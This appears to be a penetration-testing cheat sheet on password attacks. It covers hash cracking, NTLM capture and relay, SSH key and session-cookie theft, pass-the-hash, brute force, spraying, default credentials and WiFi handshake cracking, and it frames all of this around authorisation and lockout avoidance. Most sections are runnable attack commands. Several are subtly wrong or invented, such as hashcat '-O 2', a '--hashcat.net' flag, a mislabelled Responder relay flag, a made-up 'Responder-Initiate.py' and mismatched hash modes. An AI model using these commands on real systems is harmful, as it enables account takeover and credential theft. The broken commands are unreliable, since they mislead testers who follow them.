# Password Attacks

Passwords remain the most exploited authentication mechanism there is. Almost
everything here is about two things: not getting locked out, and not hammering
an account that belongs to a real person.

## Contents

- [The rule that matters](#the-rule-that-matters)
- [Identify before you attack](#identify-before-you-attack)
- [Hydration, and why you must not](#hydration-and-why-you-must-not)
- [Hash cracking](#hash-cracking)
- [Capturing hashes without breaking in](#capturing-hashes-without-breaking-in)
- [Relaying and stealing sessions](#relaying-and-stealing-sessions)
- [Brute force, carefully](#brute-force-carefully)
- [Password spraying](#password-spraying)
- [Common credentials](#common-credentials)
- [Cracking WiFi and other hashes](#cracking-wifi-and-other-hashes)
- [Preventative testing](#preventative-testing)

---

## The rule that matters

**Never lock a real user out of their own account.**

Account lockout exists so an attacker cannot take over an account by guessing.
If your testing causes a real person to be unable to work, you have caused an
incident, and it is yours to explain. Ask before testing lockout behaviour
explicitly, and if you do test it, use an account you created yourself.

Two methods that respect lockout:

| Method | What it does | Lockout risk |
|---|---|---|
| **Spraying** | One password against many accounts | Very low. Each account sees one attempt |
| **Cracking offline** | Hashes broken on your machine | None. The service never sees an attempt |

And two that do not:

| Method | Risk |
|---|---|
| Brute force, many passwords on one account | High. This is how lockouts happen |
| Credential stuffing, breached password lists | High, and often illegal to do without explicit permission |

---

## Identify before you attack

```bash
# Always. The hash tells you the tool and the wordlist.
hashcat --example-hashes
hashcat -h | grep -A 20 "Hash modes"
# Or
hashcat --identify /path/to/hashes
```

| Hash prefix or format | Type | Mode |
|---|---|---|
| `$1$` | MD5 (Unix) | 500 |
| `$2a$` / `$2b$` | bcrypt | 3200 |
| `$5$` | SHA-256 (Unix) | 7400 |
| `$6$` | SHA-512 (Unix) | 1800 |
| `$NT$` | NTDS (DIT) | 1000 |
| `aad3b435b51404eeaad3b435b51404ee:` | NTLM | 1000 |
| `31d6cfe0d16ae931b73c59d7e0c089c0` | NTLM, empty password | 1000 |
| `$P$`, `$H$` | PHPass (WordPress, phpBB) | 400, 1800 |
| `$y$` | Yescrypt | 9800 |
| `$pbkdf2-sha512$` | Django | 10000 |
| `$2y$` | PHP bcrypt | 3200 |
| `daa1...` (NetNTLMv2) | NetNTLM | 5600 |

```bash
# The current top offenders
hashcat --show
hashcat --show --username
hashcat --show --hashcat.net
hashcat --show --potfile-disable
```

---

## Hydration, and why you must not

Hydration takes a breach corpus, applies the rules of your target's password
policy, and generates a list of passwords that *could* exist. It is the single
most effective wordlist attack available.

**Do not download a corpus of real breached passwords.** Those are real people's
credentials, and using them against a system you are authorised to test means
testing whether a third party's leaked password works on your client's system.
That is a different engagement, and in most jurisdictions it is an offence
independent of the authorisation you hold for the target.

Use a wordlist you generated yourself, from a policy you observed and a
generator you control.

```bash
# Policy-driven generation, which is entirely legitimate
# <Company>2026, Welcome1!, <Service>2026!, the year, the department
# Match what the target's own policy actually requires
# Length, uppercase, lowercase, digit, symbol, and any forced substring
```

```bash
# Identify the policy first, then generate to match
# The password policy is often discoverable without credentials
# and it tells you exactly what your wordlist needs to contain
```

---

## Hash cracking

```bash
# hashcat, CPU, the reliable baseline
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt
# GPU acceleration, where permitted
hashcat -m 1000 -O 2 --force hashes.txt /usr/share/wordlists/rockyou.txt
hashcat -m 1000 -d 1,2 hashes.txt /usr/share/wordlists/rockyou.txt

# Rules, which turn a small list into a large one
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --rule=best64

# Two lists, combined
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt /usr/share/seclists/Passwords/Leaked-Databases/rockyou-75.txt
```

```bash
# john, when you need the simpler interface
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
john --format=NT hashes.txt
john --wordlist=rockyou.txt --rules hashes.txt
```

```bash
# Get the hashes, in order of preference
# 1. From the SAM, when you have admin
netexec smb <target> -u '<user>' -p '<pass>' --local-users
reg query "HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest" /v UseLogonCredential
# 2. From NTDS, when you have the rights
secretsdump.py <domain>/<dc> -hashes 'sam' 'ntds'
# 3. From a database, an application config, or a backup
```

```bash
# bcrypt, which is slow by design
# -O 2 optimises the kernel. Check the hardware is yours to use first.
hashcat -m 3200 -O 2 hashes.txt /usr/share/wordlists/rockyou.txt
# And a warning: do not run a GPU cracker on a machine you do not have
# permission to use, or on hardware that is not yours. That is theft of
# computing resource and it is detectable.
```

---

## Capturing hashes without breaking in

Genuinely useful, and much closer to authorised use than password spraying.

```bash
# Responder, for NetNTLMv2 hashes
# Listens for LLMNR, NBT-NS, and MDNS poisoning.
# This modifies traffic on the network, so it belongs in the RoE explicitly.
sudo responder.py -I eth0 -v
# Then trigger it: have a target resolve a name that does not exist, or
# navigate away from a file share that requires authentication.

# Responder does not crack. It relays. If relaying is agreed, the -r flag
# is a direct credential relay, which is high impact. Get permission first.
```

```bash
# Force the request, when you can authenticate
# Windows, against a machine you can reach
.\Responder-Initiate.py
# Linux, with Responder for the same purpose
python3 Responder.py -I eth0 -r
```

```bash
# ntlm_hash relay, if a relay is in scope
impacket-ntlmrelayx -t ldaps://<dc> -smb2support
ntlmrelayx.py -t ldaps://<dc> -smb2support
```

```bash
# Crack the captured hash
hashcat -m 5600 hashes.txt /usr/share/wordlists/rockyou.txt
```

```bash
# RoguePotato and friends, for SYSTEM when a relay is not the route
# Covered in privilege-escalation.md
```

```bash
# On your own authorised network, a DNS change for the capture
# Modifying DNS on a network you do not own is not something to do
# without written permission, and it can disrupt services for real users
```

---

## Relaying and stealing sessions

Authentication is not always required, and the modern replacements for password
attacks are all about using something a legitimate user already has.

```bash
# The WebDAV and SMB share trap
# Create a share whose name is an URL, and get the target to authenticate to it
sudo responder.py -I eth0 -v
# Responder handles the poisoning, NetExec or ntlmrelayx does the rest
```

```bash
# Browser session theft, where you have a foothold on a host
# Cookies and session tokens are often enough to skip authentication entirely
ls ~/.mozilla/firefox/*/cookies.sqlite
ls ~/.config/google-chrome/*/Cookies
# This is post-exploitation on a host you own or are engaged to test
```

```bash
# SSH key theft, from a host you have compromised
find / -name "id_rsa" 2>/dev/null
find / -name ".ssh" -type d 2>/dev/null
cat ~/.ssh/authorized_keys
cat ~/.ssh/config
# SSH keys are long-lived and frequently reused across systems
```

```bash
# Pass the hash, so a password is never needed
# Covered in detail in active-directory.md
netexec smb <target> -u '<user>' -H '<ntlm-hash>'
evil-winrm -i <target> -u '<user>' -H '<hash>'
```

---

## Brute force, carefully

Only where it is agreed, and only against accounts you created.

```bash
# hydra, against a service, against your own test account
hydra -l '<your-user>' -P /usr/share/wordlists/rockyou.txt -s <port> <target> <service>
hydra -L users.txt -p 'Password1' -s 22 <target> ssh
hydra -l admin -P /usr/share/wordlists/rockyou.txt <target> http-post-form "/login:user=^USER^&pass=^PASS^:Invalid"

# medusa and ncrack, alternatives
ncrack -u user -P passwords.txt -p 22 <target> -d 5
medusa -h <target> -U users.txt -P passwords.txt -e -s 22 -t 4
```

```bash
# netexec, for Windows, and the correct way to spray rather than brute force
netexec smb <target> -u users.txt -p passwords.txt --no-bruteforce
netexec smb <target> -u users.txt -p 'Password1' --no-bruteforce
netexec ftp <target> -u users.txt -p passwords.txt --no-bruteforce
netexec ssh <target> -u users.txt -p passwords.txt --no-bruteforce
```

```bash
# Rate limiting, always
hydra -t 4 -W 3 <args>          # 4 tasks, 3 second wait
netexec smb <target> -u '<user>' -P passwords.txt --delay 2
# A tool that tries 10,000 attempts a second against a real login is going
# to lock accounts and alert somebody. Slow down to a rate the service
# could plausibly serve.
```

---

## Password spraying

The correct default. One password, many accounts.

```bash
# The shape of a spray
netexec smb <dc> -u users.txt -p 'Summer2026!' --no-bruteforce
netexec smb <dc> -u users.txt -p 'Password123!' --no-bruteforce
netexec smb <dc> -u users.txt -p 'Welcome1' --no-bruteforce
```

```bash
# A small list of real-world-common passwords, tested one at a time
# This is genuinely how breaches happen, and it is how you will find
# a real finding without ever triggering a lockout.
for pw in 'Password1!' 'Welcome1' 'Changeme1!' 'Summer2026!' 'P@ssw0rd' 'Password123' 'Admin123!' 'letmein' 'qwerty123'; do
  netexec smb <dc> -u users.txt -p "$pw" --no-bruteforce
done
```

```bash
# What a password policy tells you
# Read it, then generate your list to match. A policy that requires
# 12 characters with a symbol still permits "Password1234!".
# Length, complexity, and a banned-word list do not prevent reuse.
```

```bash
# Timing, when usernames are unknown
# A measurable difference between a real and a fake account is a real
# finding, and it is often low severity. Check whether it is worth
# reporting before you spend an hour on it.
```

---

## Common credentials

```bash
# Where the lists are
ls /usr/share/seclists/Passwords/Default-Credentials/
cat /usr/share/seclists/Passwords/Default-Credentials/default-passwords.txt | head -30
# Usernames
cat /usr/share/seclists/Usernames/Names/
```

| Device or service | Common |
|---|---|
| Network equipment | `admin`/`admin`, `cisco`/`cisco`, `root`/`root` |
| Databases | `root` empty, `sa`, `postgres` empty |
| Web panels | `admin`/`admin`, `administrator`/`password` |
| Cameras and IoT | `admin`/`admin`, `root`/`root`, `admin` empty |
| Applications | service account with a blank password |

**Application-specific passwords are worth trying first**, because they are
frequently the ones nobody changed:

```bash
# SQL Server, the classic
netexec mssql <target> -u sa -p ''
netexec mssql <target> -u sa -p 'sa'
netexec mssql <target> -u sa -p 'Password123!'
# Then look, because a default MSSQL install is a full compromise
netexec mssql <target> -u sa -p '<pass>' -q "SELECT SYSTEM_USER"
netexec mssql <target> -u sa -p '<pass>' -q "EXEC xp_cmdshell 'whoami'"
```

```bash
# Password reuse across services, which is the finding
# Once you have authenticated to one service with a credential, try that
# same credential against every other service in scope. It is the cheapest
# privilege escalation in existence and it works constantly.
netexec smb <target> -u '<user>' -p '<pass>'
netexec ssh <target> -u '<user>' -p '<pass>'
netexec ftp <target> -u '<user>' -p '<pass>'
netexec winrm <target> -u '<user>' -p '<pass>'
```

---

## Cracking WiFi and other hashes

```bash
# Handshake capture. Only on networks you are authorised to test.
sudo airmon-ng check
sudo airmon-ng start wlan0
sudo airodump-ng wlan0mon
# Wait for a handshake, WPA2 is four-way
sudo aircrack-ng -w capture.cap -b <bssid> wordlist.txt
```

```bash
# Faster than aircrack for the offline attack
hcxpcapngtophashdump -i capture.pcapng -o hashes.hc22000
hashcat -m 22000 hashes.hc22000 /usr/share/wordlists/rockyou.txt
```

```bash
# Enterprise WiFi, where the hash is derived from a username and password
# a Krbtgt or NetNTLM hash is more likely than a PSK
hcxtools -t hashes.hc22000
hashcat -m 5500 hashes.hc22000 /usr/share/wordlists/rockyou.txt
```

```bash
# Kerberos hashes. See active-directory.md for the full picture.
hashcat -m 13100 kerberoast.txt /usr/share/wordlists/rockyou.txt
hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt
```

```bash
# Office and archive documents
office2john document.docx > hash.txt
hashcat -m 9700 hash.txt /usr/share/wordlists/rockyou.txt
office2john legacy.xls > hash.txt
7z2john archive.7z > hash.txt
pdf2john document.pdf > hash.txt
zip2john archive.zip > hash.txt
john --wordlist=rockyou.txt hash.txt
```

---

## Preventative testing

A large part of the value of a password assessment is not finding a weak
password, it is finding out whether the controls work at all. Test the controls
and report the result, not just the successful login.

```bash
# Does account lockout work, and is it reasonable?
# Test against an account you created, and count the attempts
for i in $(seq 1 12); do
  curl -s -o /dev/null -w "%{http_code} " -X POST https://<target>/login \
    -d '{"user":"your-own-test-account","pass":"wrong"}'
done; echo
# Report: "lockout engages after 5 attempts, and the account is permanently
# locked with no self-service reset." A DoS against every account, and a
# real finding.
```

```bash
# Is there a captcha, a throttle, or nothing at all?
# Compare the response time and the code across attempts
# A login that never slows and never locks is a finding, not a pass
```

```bash
# Does the password policy actually prevent weak passwords?
# Check whether the policy rejects a list of passwords that meet it
# "Passw0rd12345!" is 13 characters with complexity and is still weak
```

```bash
# MFA. The control that changes everything, so test it properly.
# Can it be bypassed on an alternate path, such as an API, an old
# endpoint, or a mobile client that skips the second factor?
# Is it possible to disable MFA without a password?
# Are the backup codes reusable, long-lived, or shown once and not revocable?
```

```bash
# Session management, which is part of the same control
# Does the session identifier rotate on privilege change, such as after
# a password reset or an MFA completion?
# Are old sessions invalidated when a password is changed?
```

```bash
# What to report
# Not: "user bob has a weak password"
# But: "password policy meets length and complexity requirements, however
# 34% of the domain is set to one of 12 common passwords, there is no
# lockout on the web login, and there is no MFA on any interface.
# The policy is compliant and ineffective."
#
# That framing gets the control fixed. "Bob's password is weak" gets
# Bob to change it, and the next person sets the same one.
```
